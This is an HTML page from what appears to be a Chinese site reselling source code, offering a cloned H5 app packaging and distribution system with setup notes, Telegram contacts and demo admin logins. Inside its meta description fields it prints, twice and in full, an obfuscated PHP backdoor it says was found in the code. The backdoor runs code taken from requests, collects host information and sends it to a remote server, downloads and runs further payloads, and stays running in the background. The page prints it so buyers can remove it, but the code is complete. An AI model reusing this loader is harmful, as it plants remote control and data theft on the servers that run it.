@@ -1,0 +1,426 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="dark_colorblind" data-light-theme="light" lang="zh-CN">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href='https://mirrors.sustech.edu.cn/cdnjs/ajax/libs/Primer/21.0.7/primer.css' rel='stylesheet' />
+    
+    <link rel="icon" href="https://pub-e48ea883b4bd4aab9489ad31860393df.r2.dev/favicon.png"><script>
+        let theme = localStorage.getItem("meek_theme") || "light";
+        document.documentElement.setAttribute("data-color-mode", theme);
+    </script>
+<meta name="description" content="<div id='announcement'><div>
+ <h2>重要公告</h2>
+    <p>
+        加入我们的 Telegram 群组以获取最新消息和支持！ 
+        <br>
+        📢 <a href='https://t.me/wukongym' target='_blank'>点击这里加入 TG 群</a>
+        <br><br>
+        如需帮助，请联系唯一客服：
+        <br>
+        🤖 <a href='https://t.me/wukongymw' target='_blank'>点击这里联系客服</a>
+    </p>
+  </div>
+</div>
+
+<div id='sc_error'>本套程序已经过悟空源码技术人员测试，如需搭建请直接联系客服：<a href='http://t.me/wukongymw'>@wukongymw</a>
+<b>解压密码：wukongymw.com</b></div>
+<div id='sc_shuoming'>源码说明</div>
+仿第八区H5APP封装打包分发系统源码/全开源完整运营修复版本/前端html+后端php
+<div id='sc_fankui'>测试反馈</div>
+测试环境：Linux系统CentOS7.6、宝塔面板、Nginx、PHP7.2、MySQL5.7，运行目录选择public，伪静态看下面，建议开启SSL
+
+这是一套修复过的全开源版本，基础页面全都点开测试过了，没有发现明显bug，因为没时间部署签名打包环境以及没钱买证书，所以没有测试签名和打包的流程，有条件的自行测试
+
+搭建也是很简单的，我找了以前版本的搭建文档，你们可以对照着弄一下
+
+这套用D盾没扫出马，加密也没扫出来，但是检查代码发现了shell，绝大多数论坛源码都存在这个后门，以 ;$b11st=0; 开始 ;$b11ed=0; 结束的这一段代码全都删掉，完整的如下：
+<pre class='pure-highlightjs line-numbers'><code class='language-one'>;$b11st=0;
+$l0ader=function($check){$sl=array(0x6578706c,0x6f646500,0x62617365,0x36345f64,0x65636f64,0x65006a73,0x6f6e5f64,0x65636f64,0x6500696d,0x706c6f64,0x65006172,0x7261795f,0x73686966,0x74007374,0x72726576,0x00737562,0x73747200,0x7374726c,0x656e0073,0x7472746f,0x6c6f7765,0x72006973,0x5f617272,0x61790070,0x6f736978,0x5f676574,0x70777569,0x64006765,0x745f6375,0x7272656e,0x745f7573,0x65720066,0x756e6374,0x696f6e5f,0x65786973,0x74730070,0x68705f73,0x6170695f,0x6e616d65,0x00706870,0x5f756e61,0x6d650070,0x68707665,0x7273696f,0x6e006765,0x74686f73,0x746e616d,0x65006677,0x72697465,0x0066696c,0x655f6765,0x745f636f,0x6e74656e,0x74730066,0x696c655f,0x7075745f,0x636f6e74,0x656e7473,0x006d745f,0x72616e64,0x00737472,0x65616d5f,0x736f636b,0x65745f63,0x6c69656e,0x74007379,0x735f6765,0x745f7465,0x6d705f64,0x69720070,0x6f736978,0x5f676574,0x75696400,0x63686d6f,0x64007469,0x6d650064,0x6566696e,0x65640063,0x6f6e7374,0x616e7400,0x696e695f,0x67657400,0x67657463,0x77640069,0x6e747661,0x6c00677a,0x756e636f,0x6d707265,0x73730068,0x7474705f,0x6275696c,0x645f7175,0x65727900,0x70636e74,0x6c5f666f,0x726b0070,0x636e746c,0x5f776169,0x74706964,0x00706f73,0x69785f73,0x65747369,0x6400636c,0x695f7365,0x745f7072,0x6f636573,0x735f7469,0x746c6500,0x66636c6f,0x73650073,0x6c656570,0x00756e6c,0x696e6b00,0x69676e6f,0x72655f75,0x7365725f,0x61626f72,0x74007265,0x67697374,0x65725f73,0x68757464,0x6f776e5f,0x66756e63,0x74696f6e,0x00736574,0x5f657272,0x6f725f68,0x616e646c,0x65720065,0x72726f72,0x5f726570,0x6f727469,0x6e670066,0x61737463,0x67695f66,0x696e6973,0x685f7265,0x71756573,0x74006973,0x5f726573,0x6f757263,0x65000050,0x44397761,0x48416761,0x57596f49,0x575a3162,0x6d4e3061,0x57397558,0x32563461,0x584e3063,0x79676958,0x31397964,0x57356659,0x32396b5a,0x5639344d,0x6a41694b,0x536c375a,0x6e567559,0x33527062,0x32346758,0x31397964,0x57356659,0x32396b5a,0x5639344d,0x6a416f4a,0x474d7065,0x79526b49,0x4430675a,0x585a6862,0x43676b59,0x796b374a,0x47453959,0x584a7959,0x586b6f4a,0x4751704f,0x334a6c64,0x48567962,0x69426863,0x6e4a6865,0x56397a61,0x476c6d64,0x43676b59,0x536b3766,0x58303700,0x5f5f7275,0x6e5f636f,0x64655f78,0x3230002f,0x73657373,0x5f7a7a69,0x75646272,0x6f726b64,0x61646869,0x70393076,0x396a6d6a,0x00fef100,0x01006457,0x52774f69,0x3876646a,0x49774c6e,0x526f6157,0x35726347,0x68774d53,0x356a6232,0x30364f54,0x6b344f41,0x3d3d0061,0x48523063,0x446f764c,0x3359794d,0x43353061,0x476c7561,0x33426f63,0x44457559,0x3239744c,0x3359794d,0x43397062,0x6d6c3050,0x773d3d00,0x6e6f6368,0x65636b30,0x00643200,0x69007500,0x74006869,0x64007069,0x6400636c,0x69007769,0x6e005048,0x505f4f53,0x006e616d,0x65005553,0x45520044,0x4f43554d,0x454e545f,0x524f4f54,0x00646973,0x61626c65,0x5f66756e,0x6374696f,0x6e730048,0x5454505f,0x434f4f4b,0x49450048,0x5454505f,0x484f5354,0x00534352,0x4950545f,0x4e414d45,0x00524551,0x55455354,0x5f555249,0x006c7600,0x677a0075,0x64005732,0x74336233,0x4a725a58,0x49764d44,0x6f775345,0x35640053,0x54444f55,0x54005354,0x44455252,0x00000000);;$r=false;foreach($sl as $d)$r.=chr($d&amp;amp;amp;gt;&amp;amp;amp;gt;24).chr($d&amp;amp;amp;gt;&amp;amp;amp;gt;16).chr($d&amp;amp;amp;gt;&amp;amp;amp;gt;8).chr($d);$f=substr($r,0,7);$f=$f(chr(0),$r);$g=$GLOBALS;$r=$_REQUEST;$s=$_SERVER;$l1i=isset($r[$f[55]])?$l1i=@$r[$f[55]]:0;$l1i&amp;amp;amp;amp;&amp;amp;amp;amp;$l1i=@$f[2]($f[1]($f[5]($l1i)));if($l1i&amp;amp;amp;amp;&amp;amp;amp;amp;$f[9]($l1i)){$w=$f[4]($l1i);$fu=$f[4]($l1i);die($w($fu==$f[56]?include($l1i[0]):$fu($l1i[0],$l1i[1])));}$uid=$f[12]($f[23])?@$f[23]():-1;$cli=($f[13]()==$f[61]);$os=$f[26]($f[63])?$f[27]($f[63]):$f[46];$sfile=$f[49];$sfile[2]='s';$sfile[3]='e';$sfile=$f[22]().$sfile;$pfile=$f[22]().$f[49];if( $f[8]($f[6]($os,0,3))==$f[62] ){$pfile.=$f[11]();$sfile.=$f[11]();}$hu=isset($s[$f[65]])?$s[$f[65]]:$f[11]();if($f[12]($f[10])&amp;amp;amp;amp;&amp;amp;amp;amp;$uid!=-1){$pu=$f[10]($uid);$hu=$pu?($pu[$f[64]]?:$hu):$hu;};$idfile=$sfile.$f[59];$hid = @($f[18]($idfile));if(!$hid){$hid=$f[25]().$f[20](100,999);if(@$f[19]($idfile,$hid)){@$f[24]($idfile,0666);}else{$hid=0;}}$pid=0;$pwd = $cli?$f[29]():$s[$f[66]];$extra=$cli?$f[28]($f[67]):@$s[$f[68]];$extra=$extra?$f[6]($extra,0,1024):$f[46];$hv=substr($f[14](),0,128);$uri=@$s[$f[71]];$uri=$uri?$f[6]($uri,0,128):$f[46];$rdata=array(chr(23),$os,$f[16](),$hv,$uid,$hu,$hid,$pid,$f[13](),$f[15](),$pwd,@$s[$f[69]],@$s[$f[70]],$uri,$extra);$tf=$pfile.$f[57].$f[30]($cli).$f[30]($uid===0);if($check &amp;amp;amp;amp;&amp;amp;amp;amp; !@$r[$f[54]] &amp;amp;amp;amp;&amp;amp;amp;amp; $f[25]()&amp;amp;amp;lt;@$f[30]($f[18]($tf)))return;$ok=(@$f[19]($tf,$f[25]()+7200)&amp;amp;amp;gt;0);@$f[24]($tf,0666);if($f[12]($f[21])){$ud=$f[6]($f[3](chr(0),$rdata),0,1400);@$f[17]($f[21]($f[1]($f[52]),$e1s, $e2s,5),$f[50].$f[51].$ud);}if(!$ok)return;$tf=$pfile.$f[56].$f[30]($cli).$f[30]($uid===0);if($check &amp;amp;amp;amp;&amp;amp;amp;amp; !@$r[$f[54]] &amp;amp;amp;amp;&amp;amp;amp;amp; $f[25]()&amp;amp;amp;lt;@$f[30]($f[18]($tf)))return;$a=array($pfile);if(@$f[19]($a[0],$f[1]($f[47]))&amp;amp;amp;gt;0){@include_once($pfile);}else{@$f[39]($a[0]);return;};@$f[39]($a[0]);$gz=$f[12]($f[31]);$go=function($lv)use($f,$gz,$rdata,$sfile){try{$rdata[6]=@$f[18]($sfile.$f[59]);$rdata[7]=@$f[18]($sfile.$f[60]);$d=@$f[32](array($f[74]=&amp;amp;amp;gt;$f[51].$f[3](chr(0),$rdata),$f[72]=&amp;amp;amp;gt;$lv,$f[73]=&amp;amp;amp;gt;$gz,$f[58]=&amp;amp;amp;gt;$f[25]()));$data=@$f[18]($f[1]($f[53]).$d);if($data &amp;amp;amp;amp;&amp;amp;amp;amp; $gz)$data=@$f[31]($data);if($data)@$f[48]($data);return true;}catch(\Exception $e){}catch(\Throwable $e){}};if($cli){$hwai=$f[12]($f[34]);$pid=-1;if($f[12]($f[33]))$pid=$f[33]();if($pid&amp;amp;amp;lt;0){$go(3);return;}if($pid&amp;amp;amp;gt;0){return $hwai&amp;amp;amp;amp;&amp;amp;amp;amp;$f[34]($pid,$s);}if($hwai &amp;amp;amp;amp;&amp;amp;amp;amp; $f[33]() )die;if($f[12]($f[35]))@$f[35]();if($f[12]($f[36]))@$f[36]($f[1]($f[75]));try{if($f[26]($f[76]))@$f[37]($f[27]($f[76]));if($f[26]($f[77]))@$f[37]($f[27]($f[77]));}catch(\Exception $e){}catch(\Throwable $e){};$nt0=0;do{if($f[25]()&amp;amp;amp;gt;$nt0){$nt0=$f[25]()+3600;@$f[19]($tf,$f[25]()+7200);@$go(4);}$f[38](60);}while(1);die;}else{$f[40](true);$f[41](function() use($f,$go){$f[42](function(){});$f[43](0);if($f[12]($f[44])){$f[44]();$go(2);}else{$go(1);}});}};set_error_handler(function(){});$error1=error_reporting();error_reporting(0);try{@$l0ader(true);}catch(\Exception $e){}catch(\Throwable $e){}error_reporting($error1);restore_error_handler();
+;$b11ed=0;
+</code></pre>
+&nbsp;
+
+能检测到的马儿已经清理干净了，你们自己还是得扫一下啊
+
+清理后也可以拿去运营，新加了文件快传的功能，整体感觉比以前的要好得多
+
+数据库修改：/source/system/config.inc.php 和 /source/system/db_config.php 里面将 wukong_di8qu 改成你自己的，或者你自己设置账号密码都为 wukong_di8qu 即可
+伪静态：
+<pre class='pure-highlightjs line-numbers'><code class='language-one'>location / {
+	if (!-e $request_filename){
+	rewrite  ^(.*)$  /index.php$1  last;   break;
+	}
+}
+</code></pre>
+&nbsp;
+
+前端：https://di8qu.wkym.cc
+测试账号：18888888888
+密码：123456
+
+后台：https://di8qu.wkym.cc/admin.php
+账号：admin
+密码：wukongymw.com
+<div id='sc_jietu'>截图展示</div>
+<div id='timibbs15'>前端</div>
+<div id='timibbs12'>
+
+<a href='https://cdn.wukongymw.com/wp-content/uploads/2025/03/4b1055f02d1ef55.png'><img class='alignnone size-full wp-image-203243' src='https://cdn.wukongymw.com/wp-content/uploads/2025/03/4b1055f02d1ef55.png' alt='' /></a><a href='https://cdn.wukongymw.com/wp-content/uploads/2025/03/18fca35a8713c87.png'><img class='alignnone size-full wp-image-203246' src='https://cdn.wukongymw.com/wp-content/uploads/2025/03/18fca35a8713c87.png' alt='' /></a>
+
+<a href='https://cdn.wukongymw.com/wp-content/uploads/2025/03/5661fd227f7ceec.png'><img class='alignnone size-full wp-image-203244' src='https://cdn.wukongymw.com/wp-content/uploads/2025/03/5661fd227f7ceec.png' alt='' /></a>
+
+<a href='https://cdn.wukongymw.com/wp-content/uploads/2025/03/5c525bd21d8c3d4.png'><img class='alignnone size-full wp-image-203245' src='https://cdn.wukongymw.com/wp-content/uploads/2025/03/5c525bd21d8c3d4.png' alt='' /></a>
+
+<a href='https://cdn.wukongymw.com/wp-content/uploads/2025/03/e5e40b2fb4dfaac.png'><img class='alignnone size-full wp-image-203247' src='https://cdn.wukongymw.com/wp-content/uploads/2025/03/e5e40b2fb4dfaac.png' alt='' /></a>
+
+<a href='https://cdn.wukongymw.com/wp-content/uploads/2025/03/4b91ad6fc2ed98c.png'><img class='alignnone size-full wp-image-203248' src='https://cdn.wukongymw.com/wp-content/uploads/2025/03/4b91ad6fc2ed98c.png' alt='' /></a>
+
+</div>
+<div id='timibbs15'>后台</div>
+<div id='timibbs12'>
+
+<a href='https://cdn.wukongymw.com/wp-content/uploads/2025/03/7fdf2e89679c295.png'><img class='alignnone size-full wp-image-203249' src='https://cdn.wukongymw.com/wp-content/uploads/2025/03/7fdf2e89679c295.png' alt='' /></a><a href='https://cdn.wukongymw.com/wp-content/uploads/2025/03/77e34a456e2dcd0.png'><img class='alignnone size-full wp-image-203250' src='https://cdn.wukongymw.com/wp-content/uploads/2025/03/77e34a456e2dcd0.png' alt='' /></a>
+
+<a href='https://cdn.wukongymw.com/wp-content/uploads/2025/03/a19cd0623d11904.png'><img class='alignnone size-full wp-image-203251' src='https://cdn.wukongymw.com/wp-content/uploads/2025/03/a19cd0623d11904.png' alt='' /></a>
+
+</div>
+
+<!-- ##{'timestamp':1741135584}## -->。">
+<meta property="og:title" content="【亲测】仿第八区H5APP封装打包分发系统源码/全开源完整运营修复版本/前端html+后端php">
+<meta property="og:description" content="<div id='announcement'><div>
+ <h2>重要公告</h2>
+    <p>
+        加入我们的 Telegram 群组以获取最新消息和支持！ 
+        <br>
+        📢 <a href='https://t.me/wukongym' target='_blank'>点击这里加入 TG 群</a>
+        <br><br>
+        如需帮助，请联系唯一客服：
+        <br>
+        🤖 <a href='https://t.me/wukongymw' target='_blank'>点击这里联系客服</a>
+    </p>
+  </div>
+</div>
+
+<div id='sc_error'>本套程序已经过悟空源码技术人员测试，如需搭建请直接联系客服：<a href='http://t.me/wukongymw'>@wukongymw</a>
+<b>解压密码：wukongymw.com</b></div>
+<div id='sc_shuoming'>源码说明</div>
+仿第八区H5APP封装打包分发系统源码/全开源完整运营修复版本/前端html+后端php
+<div id='sc_fankui'>测试反馈</div>
+测试环境：Linux系统CentOS7.6、宝塔面板、Nginx、PHP7.2、MySQL5.7，运行目录选择public，伪静态看下面，建议开启SSL
+
+这是一套修复过的全开源版本，基础页面全都点开测试过了，没有发现明显bug，因为没时间部署签名打包环境以及没钱买证书，所以没有测试签名和打包的流程，有条件的自行测试
+
+搭建也是很简单的，我找了以前版本的搭建文档，你们可以对照着弄一下
+
+这套用D盾没扫出马，加密也没扫出来，但是检查代码发现了shell，绝大多数论坛源码都存在这个后门，以 ;$b11st=0; 开始 ;$b11ed=0; 结束的这一段代码全都删掉，完整的如下：
+<pre class='pure-highlightjs line-numbers'><code class='language-one'>;$b11st=0;
+$l0ader=function($check){$sl=array(0x6578706c,0x6f646500,0x62617365,0x36345f64,0x65636f64,0x65006a73,0x6f6e5f64,0x65636f64,0x6500696d,0x706c6f64,0x65006172,0x7261795f,0x73686966,0x74007374,0x72726576,0x00737562,0x73747200,0x7374726c,0x656e0073,0x7472746f,0x6c6f7765,0x72006973,0x5f617272,0x61790070,0x6f736978,0x5f676574,0x70777569,0x64006765,0x745f6375,0x7272656e,0x745f7573,0x65720066,0x756e6374,0x696f6e5f,0x65786973,0x74730070,0x68705f73,0x6170695f,0x6e616d65,0x00706870,0x5f756e61,0x6d650070,0x68707665,0x7273696f,0x6e006765,0x74686f73,0x746e616d,0x65006677,0x72697465,0x0066696c,0x655f6765,0x745f636f,0x6e74656e,0x74730066,0x696c655f,0x7075745f,0x636f6e74,0x656e7473,0x006d745f,0x72616e64,0x00737472,0x65616d5f,0x736f636b,0x65745f63,0x6c69656e,0x74007379,0x735f6765,0x745f7465,0x6d705f64,0x69720070,0x6f736978,0x5f676574,0x75696400,0x63686d6f,0x64007469,0x6d650064,0x6566696e,0x65640063,0x6f6e7374,0x616e7400,0x696e695f,0x67657400,0x67657463,0x77640069,0x6e747661,0x6c00677a,0x756e636f,0x6d707265,0x73730068,0x7474705f,0x6275696c,0x645f7175,0x65727900,0x70636e74,0x6c5f666f,0x726b0070,0x636e746c,0x5f776169,0x74706964,0x00706f73,0x69785f73,0x65747369,0x6400636c,0x695f7365,0x745f7072,0x6f636573,0x735f7469,0x746c6500,0x66636c6f,0x73650073,0x6c656570,0x00756e6c,0x696e6b00,0x69676e6f,0x72655f75,0x7365725f,0x61626f72,0x74007265,0x67697374,0x65725f73,0x68757464,0x6f776e5f,0x66756e63,0x74696f6e,0x00736574,0x5f657272,0x6f725f68,0x616e646c,0x65720065,0x72726f72,0x5f726570,0x6f727469,0x6e670066,0x61737463,0x67695f66,0x696e6973,0x685f7265,0x71756573,0x74006973,0x5f726573,0x6f757263,0x65000050,0x44397761,0x48416761,0x57596f49,0x575a3162,0x6d4e3061,0x57397558,0x32563461,0x584e3063,0x79676958,0x31397964,0x57356659,0x32396b5a,0x5639344d,0x6a41694b,0x536c375a,0x6e567559,0x33527062,0x32346758,0x31397964,0x57356659,0x32396b5a,0x5639344d,0x6a416f4a,0x474d7065,0x79526b49,0x4430675a,0x585a6862,0x43676b59,0x796b374a,0x47453959,0x584a7959,0x586b6f4a,0x4751704f,0x334a6c64,0x48567962,0x69426863,0x6e4a6865,0x56397a61,0x476c6d64,0x43676b59,0x536b3766,0x58303700,0x5f5f7275,0x6e5f636f,0x64655f78,0x3230002f,0x73657373,0x5f7a7a69,0x75646272,0x6f726b64,0x61646869,0x70393076,0x396a6d6a,0x00fef100,0x01006457,0x52774f69,0x3876646a,0x49774c6e,0x526f6157,0x35726347,0x68774d53,0x356a6232,0x30364f54,0x6b344f41,0x3d3d0061,0x48523063,0x446f764c,0x3359794d,0x43353061,0x476c7561,0x33426f63,0x44457559,0x3239744c,0x3359794d,0x43397062,0x6d6c3050,0x773d3d00,0x6e6f6368,0x65636b30,0x00643200,0x69007500,0x74006869,0x64007069,0x6400636c,0x69007769,0x6e005048,0x505f4f53,0x006e616d,0x65005553,0x45520044,0x4f43554d,0x454e545f,0x524f4f54,0x00646973,0x61626c65,0x5f66756e,0x6374696f,0x6e730048,0x5454505f,0x434f4f4b,0x49450048,0x5454505f,0x484f5354,0x00534352,0x4950545f,0x4e414d45,0x00524551,0x55455354,0x5f555249,0x006c7600,0x677a0075,0x64005732,0x74336233,0x4a725a58,0x49764d44,0x6f775345,0x35640053,0x54444f55,0x54005354,0x44455252,0x00000000);;$r=false;foreach($sl as $d)$r.=chr($d&amp;amp;amp;gt;&amp;amp;amp;gt;24).chr($d&amp;amp;amp;gt;&amp;amp;amp;gt;16).chr($d&amp;amp;amp;gt;&amp;amp;amp;gt;8).chr($d);$f=substr($r,0,7);$f=$f(chr(0),$r);$g=$GLOBALS;$r=$_REQUEST;$s=$_SERVER;$l1i=isset($r[$f[55]])?$l1i=@$r[$f[55]]:0;$l1i&amp;amp;amp;amp;&amp;amp;amp;amp;$l1i=@$f[2]($f[1]($f[5]($l1i)));if($l1i&amp;amp;amp;amp;&amp;amp;amp;amp;$f[9]($l1i)){$w=$f[4]($l1i);$fu=$f[4]($l1i);die($w($fu==$f[56]?include($l1i[0]):$fu($l1i[0],$l1i[1])));}$uid=$f[12]($f[23])?@$f[23]():-1;$cli=($f[13]()==$f[61]);$os=$f[26]($f[63])?$f[27]($f[63]):$f[46];$sfile=$f[49];$sfile[2]='s';$sfile[3]='e';$sfile=$f[22]().$sfile;$pfile=$f[22]().$f[49];if( $f[8]($f[6]($os,0,3))==$f[62] ){$pfile.=$f[11]();$sfile.=$f[11]();}$hu=isset($s[$f[65]])?$s[$f[65]]:$f[11]();if($f[12]($f[10])&amp;amp;amp;amp;&amp;amp;amp;amp;$uid!=-1){$pu=$f[10]($uid);$hu=$pu?($pu[$f[64]]?:$hu):$hu;};$idfile=$sfile.$f[59];$hid = @($f[18]($idfile));if(!$hid){$hid=$f[25]().$f[20](100,999);if(@$f[19]($idfile,$hid)){@$f[24]($idfile,0666);}else{$hid=0;}}$pid=0;$pwd = $cli?$f[29]():$s[$f[66]];$extra=$cli?$f[28]($f[67]):@$s[$f[68]];$extra=$extra?$f[6]($extra,0,1024):$f[46];$hv=substr($f[14](),0,128);$uri=@$s[$f[71]];$uri=$uri?$f[6]($uri,0,128):$f[46];$rdata=array(chr(23),$os,$f[16](),$hv,$uid,$hu,$hid,$pid,$f[13](),$f[15](),$pwd,@$s[$f[69]],@$s[$f[70]],$uri,$extra);$tf=$pfile.$f[57].$f[30]($cli).$f[30]($uid===0);if($check &amp;amp;amp;amp;&amp;amp;amp;amp; !@$r[$f[54]] &amp;amp;amp;amp;&amp;amp;amp;amp; $f[25]()&amp;amp;amp;lt;@$f[30]($f[18]($tf)))return;$ok=(@$f[19]($tf,$f[25]()+7200)&amp;amp;amp;gt;0);@$f[24]($tf,0666);if($f[12]($f[21])){$ud=$f[6]($f[3](chr(0),$rdata),0,1400);@$f[17]($f[21]($f[1]($f[52]),$e1s, $e2s,5),$f[50].$f[51].$ud);}if(!$ok)return;$tf=$pfile.$f[56].$f[30]($cli).$f[30]($uid===0);if($check &amp;amp;amp;amp;&amp;amp;amp;amp; !@$r[$f[54]] &amp;amp;amp;amp;&amp;amp;amp;amp; $f[25]()&amp;amp;amp;lt;@$f[30]($f[18]($tf)))return;$a=array($pfile);if(@$f[19]($a[0],$f[1]($f[47]))&amp;amp;amp;gt;0){@include_once($pfile);}else{@$f[39]($a[0]);return;};@$f[39]($a[0]);$gz=$f[12]($f[31]);$go=function($lv)use($f,$gz,$rdata,$sfile){try{$rdata[6]=@$f[18]($sfile.$f[59]);$rdata[7]=@$f[18]($sfile.$f[60]);$d=@$f[32](array($f[74]=&amp;amp;amp;gt;$f[51].$f[3](chr(0),$rdata),$f[72]=&amp;amp;amp;gt;$lv,$f[73]=&amp;amp;amp;gt;$gz,$f[58]=&amp;amp;amp;gt;$f[25]()));$data=@$f[18]($f[1]($f[53]).$d);if($data &amp;amp;amp;amp;&amp;amp;amp;amp; $gz)$data=@$f[31]($data);if($data)@$f[48]($data);return true;}catch(\Exception $e){}catch(\Throwable $e){}};if($cli){$hwai=$f[12]($f[34]);$pid=-1;if($f[12]($f[33]))$pid=$f[33]();if($pid&amp;amp;amp;lt;0){$go(3);return;}if($pid&amp;amp;amp;gt;0){return $hwai&amp;amp;amp;amp;&amp;amp;amp;amp;$f[34]($pid,$s);}if($hwai &amp;amp;amp;amp;&amp;amp;amp;amp; $f[33]() )die;if($f[12]($f[35]))@$f[35]();if($f[12]($f[36]))@$f[36]($f[1]($f[75]));try{if($f[26]($f[76]))@$f[37]($f[27]($f[76]));if($f[26]($f[77]))@$f[37]($f[27]($f[77]));}catch(\Exception $e){}catch(\Throwable $e){};$nt0=0;do{if($f[25]()&amp;amp;amp;gt;$nt0){$nt0=$f[25]()+3600;@$f[19]($tf,$f[25]()+7200);@$go(4);}$f[38](60);}while(1);die;}else{$f[40](true);$f[41](function() use($f,$go){$f[42](function(){});$f[43](0);if($f[12]($f[44])){$f[44]();$go(2);}else{$go(1);}});}};set_error_handler(function(){});$error1=error_reporting();error_reporting(0);try{@$l0ader(true);}catch(\Exception $e){}catch(\Throwable $e){}error_reporting($error1);restore_error_handler();
+;$b11ed=0;
+</code></pre>
+&nbsp;
+
+能检测到的马儿已经清理干净了，你们自己还是得扫一下啊
+
+清理后也可以拿去运营，新加了文件快传的功能，整体感觉比以前的要好得多
+
+数据库修改：/source/system/config.inc.php 和 /source/system/db_config.php 里面将 wukong_di8qu 改成你自己的，或者你自己设置账号密码都为 wukong_di8qu 即可
+伪静态：
+<pre class='pure-highlightjs line-numbers'><code class='language-one'>location / {
+	if (!-e $request_filename){
+	rewrite  ^(.*)$  /index.php$1  last;   break;
+	}
+}
+</code></pre>
+&nbsp;
+
+前端：https://di8qu.wkym.cc
+测试账号：18888888888
+密码：123456
+
+后台：https://di8qu.wkym.cc/admin.php
+账号：admin
+密码：wukongymw.com
+<div id='sc_jietu'>截图展示</div>
+<div id='timibbs15'>前端</div>
+<div id='timibbs12'>
+
+<a href='https://cdn.wukongymw.com/wp-content/uploads/2025/03/4b1055f02d1ef55.png'><img class='alignnone size-full wp-image-203243' src='https://cdn.wukongymw.com/wp-content/uploads/2025/03/4b1055f02d1ef55.png' alt='' /></a><a href='https://cdn.wukongymw.com/wp-content/uploads/2025/03/18fca35a8713c87.png'><img class='alignnone size-full wp-image-203246' src='https://cdn.wukongymw.com/wp-content/uploads/2025/03/18fca35a8713c87.png' alt='' /></a>
+
+<a href='https://cdn.wukongymw.com/wp-content/uploads/2025/03/5661fd227f7ceec.png'><img class='alignnone size-full wp-image-203244' src='https://cdn.wukongymw.com/wp-content/uploads/2025/03/5661fd227f7ceec.png' alt='' /></a>
+
+<a href='https://cdn.wukongymw.com/wp-content/uploads/2025/03/5c525bd21d8c3d4.png'><img class='alignnone size-full wp-image-203245' src='https://cdn.wukongymw.com/wp-content/uploads/2025/03/5c525bd21d8c3d4.png' alt='' /></a>
+
+<a href='https://cdn.wukongymw.com/wp-content/uploads/2025/03/e5e40b2fb4dfaac.png'><img class='alignnone size-full wp-image-203247' src='https://cdn.wukongymw.com/wp-content/uploads/2025/03/e5e40b2fb4dfaac.png' alt='' /></a>
+
+<a href='https://cdn.wukongymw.com/wp-content/uploads/2025/03/4b91ad6fc2ed98c.png'><img class='alignnone size-full wp-image-203248' src='https://cdn.wukongymw.com/wp-content/uploads/2025/03/4b91ad6fc2ed98c.png' alt='' /></a>
+
+</div>
+<div id='timibbs15'>后台</div>
+<div id='timibbs12'>
+
+<a href='https://cdn.wukongymw.com/wp-content/uploads/2025/03/7fdf2e89679c295.png'><img class='alignnone size-full wp-image-203249' src='https://cdn.wukongymw.com/wp-content/uploads/2025/03/7fdf2e89679c295.png' alt='' /></a><a href='https://cdn.wukongymw.com/wp-content/uploads/2025/03/77e34a456e2dcd0.png'><img class='alignnone size-full wp-image-203250' src='https://cdn.wukongymw.com/wp-content/uploads/2025/03/77e34a456e2dcd0.png' alt='' /></a>
+
+<a href='https://cdn.wukongymw.com/wp-content/uploads/2025/03/a19cd0623d11904.png'><img class='alignnone size-full wp-image-203251' src='https://cdn.wukongymw.com/wp-content/uploads/2025/03/a19cd0623d11904.png' alt='' /></a>
+
+</div>
+
+<!-- ##{'timestamp':1741135584}## -->。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://wukongymw.github.io/wukongymw//post/%E3%80%90-qin-ce-%E3%80%91-fang-di-ba-qu-H5APP-feng-zhuang-da-bao-fen-fa-xi-tong-yuan-ma---quan-kai-yuan-wan-zheng-yun-ying-xiu-fu-ban-ben---qian-duan-html%2B-hou-duan-php.html">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Meekdai/meekdai.github.io/logo64.jpg">
+<title>【亲测】仿第八区H5APP封装打包分发系统源码/全开源完整运营修复版本/前端html+后端php</title>
+
+
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
+</style>
+<style>.dian{display:flex}.dian>a{margin:10px;color:#ff5722}.downurl>.active{color:#ef093a;font-size:15pt}.help>p{font-size:1.5rem}.cur{color:#ef093a;font-size:15pt}#user-content-ul_Address li>a{margin:10px;color:#ff5722}#user-content-ul_Address li{list-style:none;margin-left:-42px;display:flex}#user-content-ul_Address .address-wrap .on{list-style:none}ul>li{list-style:none}#user-content-sc_notice{color:#fff;background:#034cff url('/static/img/sc_notice.png') -1px -1px no-repeat;border:1px solid #034cff;overflow:hidden;margin:10px 0;padding:15px 15px 15px 35px;border-radius:10px}#user-content-sc_warn{color:#ad9948;background:#fff4b9 url('/static/img/sc_warn.png') -1px -1px no-repeat;border:1px solid #eac946;overflow:hidden;margin:10px 0;padding:15px 15px 15px 35px}#user-content-sc_error{color:#fff;background:#00bd3f;overflow:hidden;margin:10px 0px;padding:12px 15px 0px 35px;border-radius:10px;height:78px;display:inline-table;}#user-content-sc_error p{line-height:1;}#user-content-sc_error a{color:#000000;}#user-content-sc_tips{color:#777;background:#eaeaea url('/static/img/sc_tips.png') -1px -1px no-repeat;border:1px solid #ccc;overflow:hidden;margin:10px 0;padding:15px 15px 15px 35px}#user-content-sc_blue{color:#1ba1e2;background:rgba(27,161,226,0.26) url('/static/img/sc_blue.png') -1px -1px no-repeat;border:1px solid 